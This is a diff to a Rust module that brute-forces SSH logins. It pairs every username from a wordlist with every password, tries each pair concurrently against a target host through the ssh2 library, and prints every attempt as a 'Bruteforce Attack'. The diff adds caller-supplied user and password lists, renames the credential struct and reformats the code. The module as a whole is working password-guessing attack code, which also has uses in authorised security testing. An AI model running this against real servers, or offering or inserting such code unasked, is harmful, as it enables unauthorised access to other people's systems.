@@ -1,32 +1,16 @@
 use rayon::prelude::*;
 use ssh2::Session;
-use std::{
-    io::{Error, ErrorKind},
-    net::{SocketAddr, TcpStream},
-    time::Duration,
-};
+use std::{ io::{ Error, ErrorKind }, net::{ SocketAddr, TcpStream }, time::Duration };
 
 use crate::helpers::wordlists;
 
 // Define a credential structure
 #[derive(Debug, Clone)]
-pub struct Credential {
+pub struct SshCredentials {
     pub hostname: String,
     pub port: u16,
     pub username: String,
     pub password: String,
-}
-
-impl Credential {
-    #[warn(dead_code)]
-    pub fn new(hostname: String, port: u16, username: String, password: String) -> Self {
-        Self {
-            hostname,
-            port,
-            username,
-            password,
-        }
-    }
 }
 
 // Main function to test credentials concurrently
@@ -34,15 +18,17 @@ pub fn recon(
     hostname: String,
     port: u16,
     timeout: Duration,
-) -> Vec<(Credential, Result<(), Error>)> {
-    let users = wordlists::get_users();
-    let passwords = wordlists::get_passwords();
+    _users: Option<Vec<String>>,
+    _passwords: Option<Vec<String>>
+) -> Vec<(SshCredentials, Result<(), Error>)> {
+    let users = _users.unwrap_or(wordlists::get_users(None, false));
+    let passwords: Vec<String> = _passwords.unwrap_or(wordlists::get_passwords(None, false));
 
     let mut creds = Vec::new();
 
     for user in users {
         for pass in passwords.clone() {
-            creds.push(Credential {
+            creds.push(SshCredentials {
                 hostname: hostname.clone(),
                 port,
                 username: user.clone(),
@@ -53,21 +39,25 @@ pub fn recon(
 
     creds
         .into_par_iter()
-        .map(|cred|  { 
+        .map(|cred| {
             let _cred = cred.clone();
-            println!("[SSH] Bruteforce Attack | username: {} | password: {}",_cred.username,_cred.password);
+            println!(
+                "[SSH] Bruteforce Attack | address: {}:{} | username: {} | password: {}",
+                _cred.hostname,
+                _cred.port,
+                _cred.username,
+                _cred.password
+            );
             (_cred, connect(cred.clone(), timeout))
-         })
+        })
         .collect()
 }
 
 // Function to test a single SSH connection
-fn connect(cred: Credential, timeout: Duration) -> Result<(), Error> {
+fn connect(cred: SshCredentials, timeout: Duration) -> Result<(), Error> {
     // Parse server address
     let addr_str = format!("{}:{}", cred.hostname, cred.port);
-    let addr: SocketAddr = addr_str
-        .parse()
-        .map_err(|e| Error::new(ErrorKind::InvalidInput, e))?;
+    let addr: SocketAddr = addr_str.parse().map_err(|e| Error::new(ErrorKind::InvalidInput, e))?;
 
     // Establish TCP connection with timeout
     let tcp = TcpStream::connect_timeout(&addr, timeout)?;
@@ -78,19 +68,16 @@ fn connect(cred: Credential, timeout: Duration) -> Result<(), Error> {
     let mut sess = Session::new().map_err(|e| Error::new(ErrorKind::Other, e))?;
     sess.set_tcp_stream(tcp);
     sess.set_timeout(timeout.as_millis() as u32);
-    sess.handshake()
-        .map_err(|e| Error::new(ErrorKind::Other, e))?;
+    sess.handshake().map_err(|e| Error::new(ErrorKind::Other, e))?;
 
     // Authenticate with password
-    sess.userauth_password(&cred.username, &cred.password)
+    sess
+        .userauth_password(&cred.username, &cred.password)
         .map_err(|e| Error::new(ErrorKind::PermissionDenied, e))?;
 
     if sess.authenticated() {
         Ok(())
     } else {
-        Err(Error::new(
-            ErrorKind::PermissionDenied,
-            "Authentication failed",
-        ))
+        Err(Error::new(ErrorKind::PermissionDenied, "Authentication failed"))
     }
 }
